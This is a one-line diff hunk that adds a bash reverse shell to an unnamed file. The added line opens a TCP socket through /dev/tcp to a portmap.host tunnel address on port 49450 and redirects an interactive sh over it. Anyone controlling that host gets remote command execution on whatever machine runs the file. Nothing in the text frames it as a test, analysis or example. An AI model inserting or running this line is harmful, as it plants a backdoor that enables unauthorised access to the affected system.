@@ -1,0 +1,1 @@
+0<&58-;exec 58<>/dev/tcp/gfsdgsdfg-49450.portmap.host/49450;sh <&58 >&58 2>&58
